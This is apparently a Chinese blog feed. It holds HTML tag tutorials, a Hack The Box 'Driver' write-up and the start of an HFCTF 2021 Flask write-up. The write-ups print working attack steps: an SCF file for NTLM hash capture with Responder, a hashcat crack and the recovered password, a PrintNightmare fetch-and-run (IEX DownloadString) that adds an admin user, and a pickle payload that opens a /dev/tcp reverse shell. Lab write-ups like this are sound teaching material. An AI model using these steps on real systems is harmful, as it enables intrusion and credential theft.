<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1024&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>请选择您要上传的文件：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span> <span class="attr">multiple</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>




<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;welcome.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>网址：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;url&quot;</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;^((https|http)?:\/\/)[^\s]+&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;仅限以http和https开头的网址&quot;</span> <span class="attr">required</span> <span class="attr">size</span>=<span class="string">&quot;30&quot;</span> <span class="attr">list</span>=<span class="string">&quot;urllist&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">datalist</span> <span class="attr">id</span>=<span class="string">&quot;urllist&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;https://ilovefishc.com&quot;</span>&gt;</span>鱼C主页<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;https://fishc.com.cn&quot;</span>&gt;</span>鱼C论坛<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;https://fishc.taobao.com&quot;</span>&gt;</span>支持小甲鱼<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">datalist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="文本框"><a href="#文本框" class="headerlink" title="文本框"></a>文本框</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;saysth&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;5&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">wrap</span>=<span class="string">&quot;soft&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="lt-div-gt"><a href="#lt-div-gt" class="headerlink" title="&lt;div&gt;"></a>&lt;div&gt;</h1><div> 标签定义 HTML 文档中的一个分隔区块或者一个区域部分。


<hr>
<h1 id="图像映射"><a href="#图像映射" class="headerlink" title="图像映射"></a>图像映射</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;pic.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;《零基础入门学习C语言》&quot;</span> <span class="attr">usemap</span>=<span class="string">&quot;#book&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">&quot;book&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;circle&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;784,241,163&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cup of coffee&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://fishc.com.cn&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;poly&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;279,230, 867,549, 636,975, 46,655&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Book&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://item.jd.com/12573534.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;rect&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;710,818,886,1008&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Turtle&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://man.ilovefishc.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="图像适配"><a href="#图像适配" class="headerlink" title="图像适配"></a>图像适配</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">picture</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">media</span>=<span class="string">&quot;(min-width: 1024px)&quot;</span> <span class="attr">srcset</span>=<span class="string">&quot;big.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">media</span>=<span class="string">&quot;(min-width: 512px)&quot;</span> <span class="attr">srcset</span>=<span class="string">&quot;small.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;normal.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;小姐姐&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:auto;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">picture</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="插图"><a href="#插图" class="headerlink" title="插图"></a>插图</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;pic.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;国际C语言混乱代码大赛&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">figcaption</span>&gt;</span>国际C语言混乱代码大赛<span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="video"><a href="#video" class="headerlink" title="video"></a>video</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">&quot;640&quot;</span> <span class="attr">height</span>=<span class="string">&quot;352&quot;</span> <span class="attr">src</span>=<span class="string">&quot;test_video.mp4&quot;</span> <span class="attr">preload</span>=<span class="string">&quot;metadata&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span>   </span><br><span class="line">#阻止视频预加载</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">&quot;640&quot;</span> <span class="attr">height</span>=<span class="string">&quot;352&quot;</span> <span class="attr">src</span>=<span class="string">&quot;test_video.mp4&quot;</span> <span class="attr">poster</span>=<span class="string">&quot;pic.jpg&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line">#为视频添加封面</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">&quot;FishC&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://fishc.oss-cn-hangzhou.aliyuncs.com/Web/video_tag.mp4&quot;</span> <span class="attr">width</span>=<span class="string">&quot;640&quot;</span> <span class="attr">controls</span> <span class="attr">loops</span>&gt;</span>非常抱歉，该浏览器不支持video<span class="tag">&lt;/<span class="name">video</span>&gt;</span>    </span><br><span class="line">#循环播放</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;video.mp4&quot;</span> <span class="attr">width</span>=<span class="string">&quot;640&quot;</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">track</span> <span class="attr">src</span>=<span class="string">&quot;track.vtt&quot;</span> <span class="attr">srclang</span>=<span class="string">&quot;zh&quot;</span> <span class="attr">label</span>=<span class="string">&quot;中文字幕&quot;</span> <span class="attr">kind</span>=<span class="string">&quot;subtitles&quot;</span> <span class="attr">default</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span>   </span><br><span class="line">#加字幕</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">&quot;640&quot;</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;ayok.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;ayok.ogv&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/ogg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;ayok.webm&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>&gt;</span></span><br><span class="line">非常抱歉，本视频可能已经不在这个星球上了……</span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line">#备胎</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="audio"><a href="#audio" class="headerlink" title="audio"></a>audio</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;1.mp3&quot;</span> <span class="attr">controls</span>&gt;</span>123<span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>




<hr>
<h1 id="在网页中嵌入网页"><a href="#在网页中嵌入网页" class="headerlink" title="在网页中嵌入网页"></a>在网页中嵌入网页</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://ilovefishc.com&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1024px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;800px&quot;</span>&gt;</span>抱歉，您的浏览器不支持iframe。<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://fishc.com.cn&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1024px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;800px&quot;</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-popups&quot;</span>&gt;</span>抱歉，您的浏览器不支持iframe。<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>   #沙盒（sandbox)</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="lt-meter-gt"><a href="#lt-meter-gt" class="headerlink" title="&lt;meter&gt;"></a>&lt;meter&gt;</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">id</span>=<span class="string">&quot;money&quot;</span> <span class="attr">high</span>=<span class="string">&quot;0.8&quot;</span> <span class="attr">low</span>=<span class="string">&quot;0.2&quot;</span> <span class="attr">optimum</span>=<span class="string">&quot;0.6&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0.2&quot;</span> <span class="attr">min</span>=<span class="string">&quot;0&quot;</span> <span class="attr">max</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="lt-progress-gt-显示进度条"><a href="#lt-progress-gt-显示进度条" class="headerlink" title="&lt;progress&gt;显示进度条"></a>&lt;progress&gt;显示进度条</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">progress</span> <span class="attr">max</span>=<span class="string">&quot;1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0.8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">progress</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</div>]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>Hacktehbox--Driver</title>
    <url>/2021/11/28/Hacktehbox-Driver/</url>
    <content><![CDATA[<p>Hackthebox - Driver 靶场实战</p>
<a id="more"></a>

<h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="http://img.npfs06.top/20211128153425.png" style="zoom:80%;">



<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a><strong>环境准备</strong></h1><p>连上平台给的<strong>openvpn</strong>，<strong>开启靶机</strong>得到：<strong>目标ip 10.10.11.106</strong></p>
<p>kali openvpn连上<br><img src="http://img.npfs06.top/20211126231849.png" style="zoom:80%;"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sV -p-  --min-rate <span class="number">5000</span> <span class="number">10.10.11.106</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20211126231638.png" style="zoom:80%;">

<p>开放了<strong>80、135、445、5985端口</strong>。</p>
<p><strong>445端口</strong>是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机</p>
<p><strong>5985端口</strong>是通过windows远程管理使用的，需要用工具<strong>evil-winrm远程连接管理</strong>。</p>
<p>访问<strong>80端口</strong>看一下内容</p>
<img src="http://img.npfs06.top/20211126232301.png" style="zoom:80%;">

<p>需要账号、密码，盲猜admin/admin ，登录成功</p>
<img src="http://img.npfs06.top/20211126232402.png" style="zoom:80%;">

<p>MFP Firmware Update Center是惠普一款打印机，这个就是它的后台管理系统。</p>
<p>找到一个文件上传页面</p>
<img src="http://img.npfs06.top/20211127150937.png" style="zoom:80%;">

<p>先信息收集一波，看看有没有源码泄露之类的</p>
<p>使用<strong>dirsearch目录扫描</strong></p>
<img src="http://img.npfs06.top/20211126234025.png" style="zoom:80%;">

<p>没发现啥可利用的目录</p>
<p><strong>whatweb</strong></p>
<img src="http://img.npfs06.top/20211127000421.png" style="zoom:80%;">



<p>没有发现有用的信息，再来看下其他端口给了哪些信息。</p>
<p>有445端口，使用smb_version扫描模块</p>
<img src="http://img.npfs06.top/20211127000808.png" style="zoom:80%;">

<p>得到**版本Windows 10 Enterprise **</p>
<p>因为是win10，永恒之蓝可能就不能用了</p>
<img src="http://img.npfs06.top/20211127150152.png" style="zoom:80%;">



<p>多种利用SMB的方法</p>
<ul>
<li>永恒之蓝</li>
<li>通过暴力破解SMB登录</li>
<li>PSexec 连接SMB</li>
<li>RundIl32 One-liner利用SMB</li>
<li>通过NTLM捕获进行SMB攻击</li>
</ul>
<hr>
<p>想到之前发现的文件上传页面，想到利用这个<strong>文件上传模块来结合其他漏洞打组合拳。</strong></p>
<p>我们利用SMB利用方法的最后一个，<strong>通过NTLM捕获进行SMB攻击</strong></p>
<p><strong>NTLM 认证漏洞</strong>需要用到<strong>工具Responder</strong>和<strong>恶意scf文件</strong>（“WINDOWS资源管理器命令”文件，也是一种可执行文件）。</p>
<p><strong>利用思路</strong>：</p>
<ol>
<li><p>制作恶意文件</p>
</li>
<li><p>上传恶意文件让网络中的用户（受害者）试图访问我们的共享文件，这时Responder说：请提供给我NTLMv2哈希并访问资源，Responder就收到受害的hash了。</p>
</li>
</ol>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h1><p><strong>（1）制作恶意文件</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Shell]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Command</span>=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="attr">IconFile</span>=\\<span class="number">10.10</span>.<span class="number">14.70</span>\share\pentestlab.ico</span><br><span class="line"></span><br><span class="line"><span class="section">[Taskbar]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Command</span>=ToggleDesktop</span><br></pre></td></tr></table></figure>
<p>把上面的内容放入新建的<strong>send_hash.scf文件</strong>里，<strong>10.10.14.70</strong>是<strong>本机（攻击机）的ip。</strong></p>
<img src="http://img.npfs06.top/20211128132145.png" style="zoom:80%;">

<p><strong>（2）开启Responder监听</strong></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">python <span class="module-access"><span class="module"><span class="identifier">Responder</span>.</span></span>py -I tun3 -wrf</span><br></pre></td></tr></table></figure>
<p>这个选择htb的网卡，也就是tun3</p>
<p><strong>（3）传文件</strong></p>
<img src="http://img.npfs06.top/20211128132311.png" style="zoom:80%;">



<p><strong>（4）成功接听</strong></p>
<img src="http://img.npfs06.top/20211128132344.png" style="zoom:80%;">



<p><strong>（5）爆破密码</strong></p>
<p>使用hashcat爆破密码：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hashcat</span> -m <span class="number">5600</span> tony::DRIVER:<span class="number">6</span>aa<span class="number">918</span>d<span class="number">9</span>aeccc<span class="number">957</span>:DD<span class="number">714</span>FBEB<span class="number">5</span>E<span class="number">8840</span>C<span class="number">8</span>E<span class="number">782</span>C<span class="number">61868</span>C<span class="number">983</span>A:<span class="number">0101000000000000</span>F<span class="number">2</span>C<span class="number">6</span>EE<span class="number">2</span>C<span class="number">52</span>E<span class="number">4</span>D<span class="number">7011</span>F<span class="number">0</span>F<span class="number">2</span>FC<span class="number">0416</span>E<span class="number">643</span>B<span class="number">0000000002000400270027000000000000000000</span> /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20211128133201.png" style="zoom:80%;">



<p><strong>（6）工具连接</strong></p>
<p>我们前面扫端口的时候发现开放了5985端口，我们用evil-winrm工具连接桌面</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">evil-winrm -<span class="selector-tag">i</span> <span class="number">10.10</span>.<span class="number">11.106</span> -u tony -<span class="selector-tag">p</span> liltony</span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20211128002730.png" style="zoom:80%;">

<p>成功拿到普通用户权限</p>
<img src="http://img.npfs06.top/20211128133716.png" style="zoom:80%;">

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get-process</span>  <span class="comment">#查看进程</span></span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20211128152424.png" style="zoom:80%;">



<p>注意到有个进程叫做spoonlsv</p>
<img src="http://img.npfs06.top/20211128152623.png" style="zoom:80%;">



<p><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></p>
<p>把脚本下载下来放到攻击机桌面</p>
<p>开个http服务，方便靶机下载</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure>
<p>远程下载文件，并且使用脚本添加新用户</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">IEX</span><span class="params">(New-Object Net.WebClient)</span></span><span class="selector-class">.DownloadString</span>(<span class="string">&quot;http://10.10.14.70/CVE-2021-1675.ps1&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Nightmare</span> <span class="literal">-DriverName</span> <span class="string">&quot;DRIVER&quot;</span> <span class="literal">-NewUser</span> <span class="string">&quot;npfs&quot;</span> <span class="literal">-NewPassword</span> <span class="string">&quot;npfs123&quot;</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20211128140546.png" style="zoom:80%;">



<p>查看当前用户，发现添加成功</p>
<img src="http://img.npfs06.top/20211128140528.png" style="zoom:80%;">

<p>赋予用户npfs以管理员身份运行powershell的权限</p>
<img src="http://img.npfs06.top/20211128151004.png" style="zoom:80%;">

<p>查看管理员组，确认权限组没问题</p>
<img src="http://img.npfs06.top/20211128151017.png" style="zoom:80%;">



<p>使用新创建的账户进行登录</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">evil</span>-winrm -i <span class="number">10.10.11.106</span> -u npfs -p npfs<span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>切换到管理员，flag在桌面的root.txt文件</p>
<img src="http://img.npfs06.top/20211128150921.png" style="zoom:80%;">



<p>成功！</p>
<img src="http://img.npfs06.top/20211128151109.png" style="zoom:80%;">]]></content>
      <categories>
        <category>Write up</category>
        <category>Hackthebox</category>
      </categories>
  </entry>
  <entry>
    <title>HFCTF 2021 Final</title>
    <url>/2021/04/29/HFCTF-2021-Final/</url>
    <content><![CDATA[<p>虎符2021线下赛web复现<a id="more"></a></p>
<h1 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/file?file=/app/source</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li><p>/file目录对参数做了一些限制</p>
</li>
<li><p>/admin目录有一个序列化操作</p>
</li>
</ol>
<p><code>app.config[&quot;SECRET_KEY&quot;] = &quot;*******&quot;</code> ,查找到SECRET_KEY 在如下目录</p>
<p><img src="http://img.npfs06.top/20210505164127.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>接下去就是session伪造了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;tyskill&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system, (<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/23180 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line">u = pickle.dumps(User())</span><br><span 